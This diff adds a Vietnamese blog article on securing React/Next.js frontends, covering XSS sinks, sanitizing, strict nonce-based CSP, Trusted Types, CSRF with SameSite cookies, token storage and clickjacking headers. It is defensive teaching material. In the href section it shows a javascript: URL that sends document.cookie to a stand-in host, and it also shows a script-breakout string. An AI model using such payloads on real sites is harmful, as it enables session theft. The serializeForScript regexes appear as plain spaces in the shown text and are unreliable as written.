@@ -1,0 +1,460 @@
+---
+title: "Bảo mật frontend thực chiến: XSS trong React, CSP với nonce, Trusted Types, CSRF và clickjacking"
+excerpt: "React escape giúp bạn rất nhiều, nhưng không phải tất cả. Bài này đi qua những lỗ hổng XSS vẫn lọt qua React, cách dựng CSP nghiêm ngặt bằng nonce trong Next.js, Trusted Types, CSRF thời SameSite, chuyện lưu token ở đâu và cách chặn clickjacking."
+---
+
+<Lead>Nhiều team frontend mình từng làm cùng có chung một niềm tin ngầm: "Dùng React rồi thì không lo XSS". Niềm tin đó đúng khoảng 90% — và 10% còn lại chính là chỗ các sự cố thật xảy ra. Bài này không phải danh sách lý thuyết OWASP, mà là những gì mình thực sự kiểm tra và cấu hình khi đưa một ứng dụng React/Next.js lên production: XSS lọt qua đâu, dựng Content Security Policy với nonce thế nào, Trusted Types giúp gì, CSRF thay đổi ra sao khi có SameSite, và lưu token ở đâu cho trung thực với trade-off.</Lead>
+
+## Mô hình mối đe doạ: frontend bảo vệ cái gì?
+
+Trước khi vào kỹ thuật, cần nói rõ frontend *có thể* và *không thể* làm gì. Mọi kiểm tra ở trình duyệt đều có thể bị bỏ qua — kẻ tấn công không cần dùng UI của bạn, họ gửi request thẳng tới API. Vì vậy phân quyền, validate dữ liệu, giới hạn tần suất luôn là việc của server.
+
+Thứ frontend thực sự chịu trách nhiệm là **bảo vệ người dùng hợp lệ khỏi bị lợi dụng ngay trong trình duyệt của chính họ**:
+
+- **XSS (Cross-Site Scripting):** kẻ tấn công chạy được JavaScript trong origin của bạn. Khi đó họ làm được mọi thứ người dùng làm được — đọc dữ liệu trên trang, gọi API với session của người dùng, đổi giao diện để lừa nhập mật khẩu.
+- **CSRF (Cross-Site Request Forgery):** một trang khác khiến trình duyệt của người dùng gửi request kèm cookie tới server của bạn, thực hiện hành động họ không hề muốn.
+- **Clickjacking:** trang của bạn bị nhúng trong `iframe` trong suốt, người dùng tưởng bấm vào trang kia nhưng thực ra bấm vào nút "Xoá tài khoản" của bạn.
+
+Trong ba loại này, XSS nguy hiểm nhất, vì nó vô hiệu hoá gần như mọi lớp phòng thủ khác — kể cả CSRF token, vì script chạy trong origin của bạn đọc được token đó. Nên phần lớn bài này dành cho XSS.
+
+## Vì sao React escape là chưa đủ
+
+React mặc định escape mọi giá trị bạn render dưới dạng text. Viết `<p>{comment}</p>` với `comment` chứa thẻ `<img onerror=...>` thì người dùng chỉ thấy chuỗi ký tự, không có gì được thực thi. Đây là lý do React an toàn hơn nhiều so với thời nối chuỗi HTML bằng jQuery.
+
+Nhưng escape chỉ áp dụng cho **text node và giá trị attribute được React quản lý**. Có những "sink" — chỗ dữ liệu đi vào và có thể trở thành code — mà React không, hoặc không thể, bảo vệ:
+
+| Sink | Ví dụ | Vì sao nguy hiểm |
+| --- | --- | --- |
+| `dangerouslySetInnerHTML` | Render HTML từ CMS, markdown | Chuỗi được đưa thẳng vào `innerHTML`, không escape gì cả |
+| URL trong `href` / `src` | `href` lấy từ profile người dùng | Scheme `javascript:` chạy code khi người dùng bấm |
+| JSON nhúng trong `<script>` | Truyền state từ server xuống client | Chuỗi `</script>` trong dữ liệu đóng thẻ sớm |
+| DOM API trực tiếp | `ref.current.innerHTML`, `insertAdjacentHTML` | Đi vòng qua React hoàn toàn |
+| Thư viện bên thứ ba | Widget, trình render markdown, editor | Có thể tự dùng `innerHTML` bên trong |
+| Code động | `eval`, `new Function`, `setTimeout` với chuỗi | Chuỗi trở thành code |
+
+### dangerouslySetInnerHTML và nội dung HTML từ bên ngoài
+
+Cái tên đã cảnh báo rồi, nhưng nhu cầu thì có thật: bài viết từ CMS, email hiển thị trong app, kết quả markdown người dùng nhập. Quy tắc của mình rất đơn giản: **mọi HTML không do chính bạn viết ra phải qua sanitizer trước khi chạm vào DOM**, và sanitizer phải dựa trên allow-list chứ không phải block-list.
+
+Block-list (lọc bỏ `<script>`, `onerror`...) luôn thua, vì HTML có quá nhiều cách để chạy code: event handler trên đủ loại thẻ, SVG, `<iframe srcdoc>`, thẻ `<form>` với `formaction`, chưa kể các kiểu biến đổi mà parser HTML làm với markup sai cú pháp. Allow-list thì ngược lại: chỉ giữ những thẻ và attribute bạn biết là vô hại, còn lại bỏ hết. DOMPurify là lựa chọn phổ biến vì nó dùng chính parser của trình duyệt để phân tích, nên tránh được phần lớn chênh lệch giữa "cái sanitizer nghĩ" và "cái trình duyệt thực sự hiểu".
+
+```tsx
+import DOMPurify from "dompurify";
+
+const ALLOWED = {
+  ALLOWED_TAGS: ["p", "a", "strong", "em", "ul", "ol", "li", "code", "pre", "blockquote", "h2", "h3"],
+  ALLOWED_ATTR: ["href", "title"],
+  // Chỉ cho phép http(s) và mailto trong href — chặn javascript:, data:...
+  ALLOWED_URI_REGEXP: /^(?:https?:|mailto:)/i,
+};
+
+export function RichText({ html }: { html: string }) {
+  const clean = DOMPurify.sanitize(html, ALLOWED);
+  return <div className="prose" dangerouslySetInnerHTML={{ __html: clean }} />;
+}
+```
+
+Vài điều mình rút ra khi dùng sanitizer:
+
+- **Sanitize càng gần chỗ render càng tốt.** Dữ liệu "đã sạch lúc lưu vào DB" không còn sạch nếu sau này bạn đổi cách render, hoặc có một đường ghi dữ liệu khác bỏ qua bước lọc.
+- **Chạy trên server cần môi trường DOM.** DOMPurify cần `window`; khi render trên server bạn phải dùng bản có kèm DOM giả lập (ví dụ qua jsdom) hoặc sanitize ở client. Đừng tự viết regex thay thế.
+- **Cập nhật thường xuyên.** Sanitizer là phần mềm bảo mật — các lỗi bypass vẫn được tìm ra và vá theo thời gian.
+
+<Callout>
+  **Markdown không tự động an toàn.** Nhiều trình render markdown cho phép HTML thô đi xuyên qua theo mặc định, và link kiểu `[bấm vào đây](javascript:...)` là cú pháp markdown hoàn toàn hợp lệ. Hãy tắt raw HTML nếu không cần, và vẫn sanitize kết quả HTML cuối cùng — đừng tin vào cấu hình của thư viện markdown như lớp phòng thủ duy nhất.
+</Callout>
+
+### URL `javascript:` trong href
+
+Đây là lỗi mình gặp nhiều nhất trong code review, vì nó trông vô hại:
+
+```tsx
+// Người dùng tự nhập "website" trong profile
+<a href={user.website}>Website của {user.name}</a>
+```
+
+Nếu `user.website` là `javascript:fetch('https://evil.example/?c='+document.cookie)`, React vẫn đặt nó vào `href` — escape không giúp gì vì đây là giá trị attribute hợp lệ. Các bản React gần đây có cảnh báo hoặc chặn URL `javascript:`, nhưng mình không coi đó là lớp phòng thủ: nó không bao phủ mọi sink (ví dụ URL bạn truyền cho `window.location` hay `window.open`), và hành vi thay đổi theo phiên bản. Cách đúng là validate scheme bằng allow-list:
+
+```ts
+const SAFE_PROTOCOLS = new Set(["http:", "https:", "mailto:"]);
+
+export function safeUrl(input: string, fallback = "#"): string {
+  try {
+    // Base URL giúp xử lý cả đường dẫn tương đối
+    const url = new URL(input, window.location.origin);
+    return SAFE_PROTOCOLS.has(url.protocol) ? url.href : fallback;
+  } catch {
+    return fallback;
+  }
+}
+```
+
+Dùng `new URL()` thay vì kiểm tra `startsWith("javascript:")`, vì trình duyệt chấp nhận nhiều biến thể: chữ hoa, khoảng trắng hay ký tự điều khiển ở đầu chuỗi, tab chen giữa. Parser URL chuẩn đã chuẩn hoá hết những thứ đó trước khi bạn kiểm tra `protocol`.
+
+### JSON từ server nhúng trong thẻ script
+
+Pattern quen thuộc: server render trang rồi nhúng state ban đầu vào HTML để client hydrate.
+
+```tsx
+// ❌ Nguy hiểm
+<script
+  dangerouslySetInnerHTML={{
+    __html: `window.__INITIAL_STATE__ = ${JSON.stringify(state)}`,
+  }}
+/>
+```
+
+`JSON.stringify` tạo ra JSON hợp lệ, nhưng **không** escape chuỗi `</script>`. Nếu một trường trong `state` (tên người dùng, tiêu đề bài viết) chứa `</script><script>alert(1)</script>`, parser HTML sẽ đóng thẻ script ngay chỗ đó — nó không quan tâm bạn đang ở giữa một chuỗi JavaScript — và phần sau trở thành một thẻ script mới. Cách sửa là escape ký tự `<` (và vài ký tự đặc biệt khác) thành chuỗi Unicode escape:
+
+```ts
+export function serializeForScript(data: unknown): string {
+  return JSON.stringify(data)
+    .replace(/</g, "\\u003c")
+    .replace(/>/g, "\\u003e")
+    .replace(/&/g, "\\u0026")
+    .replace(/ /g, "\\u2028")
+    .replace(/ /g, "\\u2029");
+}
+```
+
+Kết quả vẫn là JSON/JavaScript hợp lệ, giá trị sau khi parse giữ nguyên, nhưng parser HTML không còn thấy thẻ đóng nào. Tốt hơn nữa là dùng `<script type="application/json">` rồi đọc bằng `JSON.parse(el.textContent)` — dữ liệu không bao giờ được thực thi như code, dù vẫn cần escape `<` để không bị đóng thẻ sớm. Nếu bạn dùng App Router của Next.js, framework đã tự lo phần serialize dữ liệu cho Server Components; rủi ro nằm ở những chỗ bạn tự viết thẻ script như trên, ví dụ JSON-LD cho SEO.
+
+## Content Security Policy: lớp phòng thủ thứ hai
+
+Sanitize và validate là lớp thứ nhất — ngăn payload đi vào. Nhưng sớm muộn gì cũng có một chỗ bị sót. **Content Security Policy (CSP)** là lớp thứ hai: kể cả khi kẻ tấn công chèn được markup vào trang, trình duyệt từ chối chạy script không được bạn cho phép.
+
+### Vì sao allow-list theo domain không hiệu quả
+
+CSP kiểu cũ liệt kê domain được phép: `script-src 'self' cdn.example.com www.google-analytics.com`. Vấn đề là các domain lớn thường host cả những endpoint có thể bị lợi dụng — JSONP callback, thư viện cũ có "script gadget", hay file do người dùng upload. Chỉ cần một domain trong danh sách có điểm yếu như vậy, policy bị bypass. Danh sách cũng phình ra theo thời gian và không ai dám xoá dòng nào.
+
+Cách tiếp cận được khuyến nghị hiện nay là **strict CSP** dựa trên nonce:
+
+```http
+Content-Security-Policy:
+  script-src 'nonce-R4nd0mV4lu3' 'strict-dynamic' https: 'unsafe-inline';
+  object-src 'none';
+  base-uri 'none';
+  frame-ancestors 'none';
+```
+
+Từng phần một:
+
+- **`'nonce-...'`**: chỉ thẻ script có attribute `nonce` khớp đúng giá trị này mới được chạy. Nonce sinh ngẫu nhiên **cho mỗi response**, nên kẻ tấn công chèn được `<script>` cũng không đoán được nonce.
+- **`'strict-dynamic'`**: script đã được tin (nhờ nonce) được phép nạp thêm script khác bằng code, ví dụ qua `document.createElement("script")`. Nhờ vậy bundler, code splitting, tag manager vẫn chạy mà bạn không cần liệt kê domain. Ở trình duyệt hỗ trợ `'strict-dynamic'`, các allow-list theo host và `'self'` trong `script-src` bị bỏ qua.
+- **`https:` và `'unsafe-inline'`**: chỉ là fallback cho trình duyệt cũ không hiểu nonce hay `'strict-dynamic'`. Trình duyệt hiện đại bỏ qua `'unsafe-inline'` khi có nonce, nên nó không làm yếu policy ở đó.
+- **`object-src 'none'`**: chặn plugin kiểu `<object>`/`<embed>`, một đường chạy code cũ.
+- **`base-uri 'none'`**: chặn thẻ `<base>` bị chèn vào để đổi gốc của mọi URL tương đối — kể cả URL của script hợp lệ.
+
+<Callout>
+  **Nonce không chặn inline event handler — và đó là điều tốt.** Attribute như `onclick="..."` trong HTML sẽ bị chặn dưới strict CSP, vì không có cách gắn nonce cho chúng. Event handler của React (`onClick`) không bị ảnh hưởng vì React gắn listener bằng JavaScript, không sinh attribute HTML. Thường thì code cũ, thư viện cũ hoặc snippet marketing mới là thứ vỡ.
+</Callout>
+
+### Sinh nonce mỗi request trong Next.js
+
+Next.js hỗ trợ nonce khá tốt: nếu request đi vào có header CSP chứa nonce, framework tự gắn nonce đó vào các thẻ script nó sinh ra. Việc của bạn là sinh nonce trong proxy (từ Next.js 16, `middleware.ts` được đổi tên thành `proxy.ts`; bản cũ hơn dùng `middleware.ts` và export hàm `middleware`).
+
+```ts
+// proxy.ts
+import { NextResponse, type NextRequest } from "next/server";
+
+export function proxy(request: NextRequest) {
+  const nonce = Buffer.from(crypto.randomUUID()).toString("base64");
+  const isDev = process.env.NODE_ENV === "development";
+
+  const csp = [
+    `default-src 'self'`,
+    // React ở chế độ dev cần eval để debug; production thì không
+    `script-src 'nonce-${nonce}' 'strict-dynamic' https: 'unsafe-inline'${isDev ? " 'unsafe-eval'" : ""}`,
+    `style-src 'self' 'unsafe-inline'`,
+    `img-src 'self' blob: data: https:`,
+    `font-src 'self'`,
+    `connect-src 'self'`,
+    `object-src 'none'`,
+    `base-uri 'none'`,
+    `form-action 'self'`,
+    `frame-ancestors 'none'`,
+    `upgrade-insecure-requests`,
+  ].join("; ");
+
+  // Gắn CSP vào request để Next.js đọc được nonce khi render
+  const requestHeaders = new Headers(request.headers);
+  requestHeaders.set("x-nonce", nonce);
+  requestHeaders.set("Content-Security-Policy", csp);
+
+  const response = NextResponse.next({ request: { headers: requestHeaders } });
+  // ...và vào response để trình duyệt áp dụng
+  response.headers.set("Content-Security-Policy", csp);
+  return response;
+}
+
+export const config = {
+  matcher: [
+    {
+      source: "/((?!api|_next/static|_next/image|favicon.ico).*)",
+      // Bỏ qua request prefetch — chúng không cần CSP riêng
+      missing: [
+        { type: "header", key: "next-router-prefetch" },
+        { type: "header", key: "purpose", value: "prefetch" },
+      ],
+    },
+  ],
+};
+```
+
+Khi cần nonce cho script tự thêm (analytics, JSON-LD), đọc nó trong Server Component:
+
+```tsx
+// app/layout.tsx
+import { headers } from "next/headers";
+import Script from "next/script";
+
+export default async function RootLayout({ children }: { children: React.ReactNode }) {
+  const nonce = (await headers()).get("x-nonce") ?? undefined;
+
+  return (
+    <html lang="vi">
+      <body>
+        {children}
+        <Script src="https://analytics.example.com/a.js" strategy="afterInteractive" nonce={nonce} />
+      </body>
+    </html>
+  );
+}
+```
+
+Ba lưu ý thực tế:
+
+1. **Nonce buộc trang phải render động.** Mỗi response có nonce khác nhau, nên HTML không thể được build sẵn tĩnh hay cache ở CDN như cũ. Với blog hay trang marketing thuần tĩnh, đây là trade-off đáng cân nhắc — có thể dùng CSP dựa trên hash, hoặc chấp nhận một policy lỏng hơn cho các trang không có dữ liệu người dùng.
+2. **Nonce phải thực sự ngẫu nhiên và không bao giờ tái sử dụng.** Dùng Web Crypto, không dùng `Math.random()`, không cache response có nonce rồi phục vụ cho người khác.
+3. **`style-src 'unsafe-inline'` là một thoả hiệp.** Nhiều thư viện CSS-in-JS và cả style inline của React cần nó. Inject CSS kém nguy hiểm hơn inject script nhiều, nên mình chấp nhận ở bước đầu và siết lại sau nếu stack cho phép.
+
+### Triển khai bằng Report-Only, đừng bật thẳng
+
+Bật CSP nghiêm ngặt thẳng lên production gần như chắc chắn làm vỡ thứ gì đó: một snippet chat support, một script A/B testing, một extension nội bộ. Quy trình mình dùng:
+
+1. **Gửi header `Content-Security-Policy-Report-Only`** với đúng policy bạn định dùng. Trình duyệt không chặn gì, chỉ báo cáo những gì *lẽ ra* bị chặn.
+2. **Thu thập report** về một endpoint riêng, để chạy ít nhất một chu kỳ phát hành, đủ lâu để gặp các luồng hiếm.
+3. **Phân loại vi phạm:** cái nào là code của mình cần sửa, cái nào là script bên thứ ba cần nonce, cái nào là nhiễu.
+4. **Chuyển sang `Content-Security-Policy`** khi report đã sạch, và tiếp tục giữ reporting để phát hiện thoái lui.
+
+```http
+Reporting-Endpoints: csp="https://example.com/api/csp-report"
+Content-Security-Policy-Report-Only: script-src 'nonce-R4nd0mV4lu3' 'strict-dynamic'; object-src 'none'; base-uri 'none'; report-to csp; report-uri https://example.com/api/csp-report
+```
+
+`report-to` là cơ chế mới dựa trên Reporting API; `report-uri` đã bị đánh dấu deprecated nhưng vẫn được hỗ trợ rộng rãi hơn, nên mình khai báo cả hai. Bạn có thể gửi đồng thời một policy enforce đang chạy ổn và một policy report-only chặt hơn — hai header độc lập với nhau.
+
+<Callout>
+  **Report CSP rất nhiễu.** Extension trình duyệt, phần mềm diệt virus chèn script, trình duyệt cũ… tạo ra rất nhiều vi phạm không liên quan đến code của bạn. Hãy nhóm theo `blocked-uri` và `violated-directive`, lọc bỏ các scheme như `chrome-extension:`, và giới hạn tần suất endpoint — nó là một URL công khai, ai cũng có thể gửi rác vào.
+</Callout>
+
+## Trusted Types: chặn DOM XSS ngay tại sink
+
+CSP với nonce kiểm soát *script nào được nạp*, nhưng không ngăn được code hợp lệ của bạn tự đưa chuỗi độc vào `innerHTML`. Đó là DOM XSS — dữ liệu đi từ URL, `postMessage` hay API vào một sink nguy hiểm mà không cần server phản hồi gì đặc biệt.
+
+**Trusted Types** giải quyết đúng điểm này. Khi bật, các sink nguy hiểm như `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `eval`, `script.src` sẽ **từ chối chuỗi thường** và chỉ nhận các object kiểu `TrustedHTML`, `TrustedScript`, `TrustedScriptURL`. Các object này chỉ tạo được qua *policy* do bạn định nghĩa:
+
+```http
+Content-Security-Policy: require-trusted-types-for 'script'; trusted-types app-html dompurify
+```
+
+- `require-trusted-types-for 'script'` bật cơ chế bắt buộc.
+- `trusted-types` giới hạn những tên policy được phép tạo — để một thư viện lạ không tự tạo policy "rửa" mọi thứ.
+
+```ts
+import DOMPurify from "dompurify";
+
+// Feature-detect: không phải trình duyệt nào cũng có trustedTypes
+const appHtmlPolicy =
+  typeof window !== "undefined" && window.trustedTypes
+    ? window.trustedTypes.createPolicy("app-html", {
+        createHTML: (input: string) => DOMPurify.sanitize(input),
+      })
+    : null;
+
+export function setSafeHtml(el: HTMLElement, html: string) {
+  // Với Trusted Types, gán chuỗi thô vào innerHTML sẽ ném lỗi;
+  // chỉ object do policy tạo ra mới được chấp nhận.
+  el.innerHTML = (appHtmlPolicy?.createHTML(html) ?? DOMPurify.sanitize(html)) as string;
+}
+```
+
+Giá trị thật của Trusted Types là **đổi bài toán review**: thay vì phải soát mọi chỗ trong codebase có thể chạm vào `innerHTML`, bạn chỉ cần review vài policy. Mọi đường đi khác vào sink sẽ ném lỗi ngay khi chạy, kèm report nếu bạn bật reporting.
+
+Thực tế triển khai:
+
+- **Hỗ trợ trình duyệt:** Trusted Types có trên các trình duyệt nhân Chromium từ lâu; các engine khác đã và đang bổ sung. Hãy kiểm tra số liệu hỗ trợ hiện tại trước khi quyết định. Trình duyệt không hỗ trợ chỉ đơn giản là bỏ qua directive, nên đây là lớp bảo vệ cộng thêm chứ không làm hỏng gì.
+- **Bắt đầu bằng report-only**, giống CSP. Bạn sẽ ngạc nhiên về số thư viện vẫn gán `innerHTML` bằng chuỗi.
+- **Policy tên `default`** là lối thoát cho migration: nó được gọi tự động khi có chuỗi thô đi vào sink. Tiện, nhưng nếu nó chỉ trả lại nguyên input thì bạn vừa tắt toàn bộ bảo vệ. Chỉ dùng tạm, kèm sanitize và log.
+
+## CSRF trong thời SameSite cookie
+
+CSRF khai thác một hành vi cơ bản: trình duyệt tự đính cookie vào request gửi tới domain của bạn, bất kể request đó xuất phát từ trang nào. Một form ẩn trên `evil.example` tự submit `POST /transfer` tới ngân hàng của bạn — cookie session đi kèm, server thấy hợp lệ.
+
+### SameSite thay đổi bức tranh
+
+Attribute `SameSite` cho phép server nói với trình duyệt khi nào được gửi cookie trong request cross-site:
+
+| Giá trị | Gửi cookie khi | Ghi chú |
+| --- | --- | --- |
+| `Strict` | Chỉ request same-site | An toàn nhất, nhưng bấm link từ email vào sẽ thấy như chưa đăng nhập |
+| `Lax` | Same-site, và điều hướng top-level bằng method "an toàn" như `GET` | Chặn form `POST` cross-site, `fetch`, `iframe`, ảnh |
+| `None` | Mọi request (bắt buộc kèm `Secure`) | Cần cho cookie dùng trong iframe nhúng cross-site |
+
+Chrome coi cookie không khai báo `SameSite` là `Lax`, nhưng không phải trình duyệt nào cũng áp dụng mặc định này giống nhau. Bài học: **luôn khai báo `SameSite` tường minh**, đừng dựa vào mặc định.
+
+```http
+Set-Cookie: __Host-session=abc123; Path=/; Secure; HttpOnly; SameSite=Lax
+```
+
+Prefix `__Host-` buộc cookie phải có `Secure`, `Path=/` và không có `Domain` — nghĩa là nó chỉ thuộc về đúng host đó, subdomain khác không ghi đè được. Rẻ mà hiệu quả.
+
+### Khi nào vẫn cần CSRF token
+
+Với `SameSite=Lax`, phần lớn CSRF kinh điển đã bị chặn. Nhưng vẫn còn những trường hợp:
+
+- **Request `GET` có tác dụng phụ.** `Lax` vẫn gửi cookie khi điều hướng top-level bằng `GET`. Nếu `GET /logout` hay `GET /api/delete?id=1` thay đổi dữ liệu, bạn vẫn bị tấn công. Sửa gốc rễ: `GET` không bao giờ được thay đổi state.
+- **"Same-site" không phải "same-origin".** Site được xác định theo domain có thể đăng ký (eTLD+1), nên `blog.example.com` và `app.example.com` là same-site. Một subdomain bị XSS hay bị chiếm (ví dụ do bản ghi DNS trỏ tới dịch vụ đã huỷ) có thể gửi request kèm cookie `SameSite=Strict` tới app chính.
+- **Cookie buộc phải là `SameSite=None`** — app chạy trong iframe của bên thứ ba, luồng SSO đặc thù.
+- **Trình duyệt cũ** không hiểu SameSite.
+- **Login CSRF:** kẻ tấn công đăng nhập người dùng vào tài khoản *của kẻ tấn công*, rồi chờ họ nhập thông tin thẻ.
+
+Với những trường hợp này, thêm một lớp nữa:
+
+- **Synchronizer token / double-submit cookie:** server cấp token ngẫu nhiên, client gửi lại trong header hoặc body; server so sánh. Trang khác không đọc được token nên không giả mạo được.
+- **Kiểm tra header `Origin` (hoặc `Sec-Fetch-Site`)** cho request thay đổi state. Trình duyệt hiện đại gửi các header này và JavaScript trên trang khác không giả được. Cách này đơn giản và hiệu quả, đặc biệt cho API.
+
+```ts
+// Một lớp kiểm tra đơn giản cho route thay đổi dữ liệu
+export function assertSameOrigin(req: Request) {
+  const site = req.headers.get("sec-fetch-site");
+  if (site && site !== "same-origin" && site !== "none") {
+    throw new Response("Forbidden", { status: 403 });
+  }
+  const origin = req.headers.get("origin");
+  if (origin && origin !== process.env.APP_ORIGIN) {
+    throw new Response("Forbidden", { status: 403 });
+  }
+}
+```
+
+Nếu bạn dùng Server Actions của Next.js, framework đã chỉ cho phép method `POST` và so sánh `Origin` với host của request — một lớp bảo vệ có sẵn. Nhưng Route Handler (`app/api/.../route.ts`) thì không có, bạn phải tự làm.
+
+### CORS không phải là bảo vệ CSRF
+
+Đây là hiểu nhầm phổ biến nhất mình gặp: "API mình bật CORS chặt rồi, chỉ cho origin của mình, nên không lo CSRF". Sai.
+
+CORS kiểm soát việc **trang khác có được đọc response** hay không, không phải việc request **có được gửi đi** hay không. Một "simple request" — form `POST` với `Content-Type` là `application/x-www-form-urlencoded`, `multipart/form-data` hoặc `text/plain` — được gửi thẳng tới server mà không có preflight. Server xử lý xong, thực hiện chuyển tiền, rồi trình duyệt mới chặn trang kia đọc kết quả. Thiệt hại đã xảy ra.
+
+Bắt buộc `Content-Type: application/json` hoặc một custom header *có* buộc trình duyệt phải preflight, và đó là một lớp giảm thiểu thật. Nhưng nó mong manh: một endpoint lỡ chấp nhận cả form data, hay một cấu hình CORS phản chiếu mọi `Origin` kèm credentials, là đủ để mở lại lỗ hổng. Hãy coi nó là phụ, không phải chính.
+
+<Callout>
+  **Không có lớp chống CSRF nào sống sót qua XSS.** Script chạy trong origin của bạn gửi request same-origin, đọc được CSRF token trên trang, và có đầy đủ cookie. Đó là lý do mình luôn ưu tiên XSS trước: chặn được XSS thì CSRF token mới có ý nghĩa.
+</Callout>
+
+## Lưu token ở đâu: httpOnly cookie hay localStorage
+
+Câu hỏi này gây tranh cãi vì cả hai phe đều đúng một phần. Hãy nhìn trung thực:
+
+| | `httpOnly` cookie | `localStorage` / `sessionStorage` | Bộ nhớ JS (biến) |
+| --- | --- | --- | --- |
+| **XSS đọc trộm được token?** | Không | Có — một dòng code là lấy được | Khó hơn, nhưng script cùng trang vẫn có thể móc vào code của bạn |
+| **XSS dùng được session?** | Có, khi trang còn mở | Có | Có |
+| **Lộ CSRF?** | Có — cần SameSite và/hoặc token | Không, vì token không tự gửi | Không |
+| **Sống qua reload?** | Có | Có | Không — cần cơ chế refresh |
+| **Dùng cho API khác domain** | Phức tạp (CORS credentials, SameSite) | Dễ | Dễ |
+
+Điểm mấu chốt: **httpOnly không ngăn XSS gây hại**. Kẻ tấn công không lấy được token, nhưng vẫn gửi request thay người dùng chừng nào tab còn mở. Cái httpOnly mua cho bạn là **giới hạn thời gian và phạm vi thiệt hại**: không có token bị lấy ra để dùng từ máy khác, dùng sau nhiều ngày, hay bán lại. Với token sống lâu, đây là khác biệt rất lớn.
+
+Lựa chọn của mình cho phần lớn web app:
+
+- **Session hoặc refresh token trong cookie `__Host-`, `HttpOnly`, `Secure`, `SameSite=Lax`** (hoặc `Strict` nếu UX chấp nhận được), kèm kiểm tra `Origin` cho request thay đổi dữ liệu.
+- **Nếu cần access token cho API bên thứ ba**, giữ nó trong bộ nhớ, thời gian sống ngắn, lấy lại qua refresh cookie. Hoặc tốt hơn: dùng pattern backend-for-frontend (BFF) để token không bao giờ xuống trình duyệt.
+- **Tránh lưu token sống lâu trong `localStorage`.** Không phải vì localStorage "không an toàn" theo nghĩa tuyệt đối, mà vì nó biến mọi lỗ hổng XSS nhỏ thành một vụ lộ thông tin xác thực kéo dài.
+
+## Clickjacking và frame-ancestors
+
+Clickjacking không cần chạy code trong trang của bạn. Kẻ tấn công nhúng trang của bạn vào `iframe` trong suốt, đặt nó chồng lên một nút "Nhận quà" hấp dẫn. Người dùng bấm "Nhận quà", nhưng cú click thực ra rơi vào nút "Xác nhận" của bạn — với đầy đủ session vì cookie vẫn đi kèm (trừ khi SameSite chặn trong iframe cross-site, một lớp bảo vệ phụ có ích).
+
+Cách phòng thủ là nói với trình duyệt ai được phép nhúng trang của bạn:
+
+```http
+Content-Security-Policy: frame-ancestors 'none'
+X-Frame-Options: DENY
+```
+
+- **`frame-ancestors 'none'`** — không ai được nhúng. Dùng `'self'` nếu chính app của bạn cần iframe trang của nó, hoặc liệt kê origin cụ thể cho đối tác.
+- **`X-Frame-Options`** là header cũ hơn, chỉ có `DENY` và `SAMEORIGIN` (giá trị `ALLOW-FROM` đã lỗi thời). Khi có cả hai, trình duyệt hiện đại ưu tiên `frame-ancestors`; mình vẫn gửi `X-Frame-Options` cho trình duyệt cũ vì chi phí bằng không.
+- **`frame-ancestors` không hoạt động trong thẻ `<meta>`** — phải gửi qua HTTP header. Lỗi này hay gặp ở các site tĩnh chỉ cấu hình CSP bằng meta tag.
+
+Đừng dùng JavaScript "frame-busting" kiểu kiểm tra `window.top !== window.self` làm lớp chính — trang nhúng có thể vô hiệu hoá nó bằng attribute `sandbox` của iframe.
+
+Trong Next.js, cách đơn giản nhất cho các header tĩnh là khai báo trong `next.config.ts`:
+
+```ts
+// next.config.ts
+import type { NextConfig } from "next";
+
+const securityHeaders = [
+  { key: "X-Frame-Options", value: "DENY" },
+  { key: "X-Content-Type-Options", value: "nosniff" },
+  { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
+  { key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains; preload" },
+];
+
+const nextConfig: NextConfig = {
+  async headers() {
+    return [{ source: "/:path*", headers: securityHeaders }];
+  },
+};
+
+export default nextConfig;
+```
+
+CSP có nonce thì vẫn để ở proxy vì phải sinh theo từng request. Cẩn thận với `preload` trong HSTS: nó gần như không thể rút lại nhanh, chỉ bật khi mọi subdomain đã chạy HTTPS ổn định.
+
+## Checklist bảo mật cho một frontend PR
+
+Đây là danh sách mình thực sự dùng khi review. Không cần áp hết cho mọi PR — chỉ những mục liên quan đến thay đổi.
+
+**Render dữ liệu**
+
+- Có `dangerouslySetInnerHTML`, `innerHTML`, `insertAdjacentHTML` mới không? Nếu có, dữ liệu đã qua sanitizer allow-list chưa, và sanitize ở đâu?
+- URL do người dùng hoặc API cung cấp có đi vào `href`, `src`, `window.location`, `window.open` không? Đã validate scheme chưa?
+- Có nhúng dữ liệu vào thẻ `<script>` (state ban đầu, JSON-LD) không? Đã escape `<` chưa?
+- Có `eval`, `new Function`, hay `setTimeout` với tham số chuỗi không?
+
+**Thư viện và script bên thứ ba**
+
+- Thư viện mới có tự render HTML không (markdown, rich text, chart có tooltip HTML)? Cấu hình mặc định có an toàn không?
+- Script bên thứ ba mới có cần thêm vào CSP không? Nó có thực sự cần chạy trên mọi trang, kể cả trang thanh toán hay cài đặt tài khoản?
+
+**Cookie, auth và request**
+
+- Route hay endpoint mới có thay đổi state qua `GET` không?
+- Route Handler thay đổi dữ liệu có kiểm tra `Origin`/`Sec-Fetch-Site` hoặc CSRF token không?
+- Cookie mới có đủ `HttpOnly`, `Secure`, `SameSite` tường minh không? Có lưu token nào vào `localStorage` không?
+- Có dữ liệu nhạy cảm nào bị log ra console, gửi vào analytics, hay nằm trong URL (sẽ lọt vào lịch sử và header `Referer`) không?
+
+**Header**
+
+- Thay đổi có làm CSP lỏng hơn không (thêm `'unsafe-inline'`, `'unsafe-eval'`, wildcard)? Nếu có, lý do được ghi lại chưa?
+- Trang mới có cần cho phép nhúng iframe không? Nếu không, `frame-ancestors` vẫn đang áp dụng chứ?
+
+<Callout>
+  **Tự động hoá phần nhàm chán.** Rule ESLint cấm `dangerouslySetInnerHTML` (cho phép tắt từng chỗ kèm comment giải thích), một test kiểm tra header CSP trong response, và cảnh báo khi report CSP tăng đột biến — ba thứ này bắt được nhiều lỗi hơn bất kỳ checklist nào phụ thuộc vào trí nhớ của người review.
+</Callout>
+
+## Tóm tắt
+
+<Checklist>
+
+- React escape text và attribute, nhưng không bảo vệ `dangerouslySetInnerHTML`, URL `javascript:`, JSON trong thẻ script hay DOM API trực tiếp.
+- HTML từ bên ngoài phải qua sanitizer allow-list như DOMPurify, càng gần chỗ render càng tốt; URL phải validate scheme bằng `new URL()`.
+- Dùng strict CSP với nonce sinh mỗi request và `'strict-dynamic'`, triển khai qua Report-Only trước, và giữ reporting sau khi enforce.
+- Trusted Types biến mọi sink DOM nguy hiểm thành chỗ chỉ nhận object từ policy bạn kiểm soát — review vài policy thay vì cả codebase.
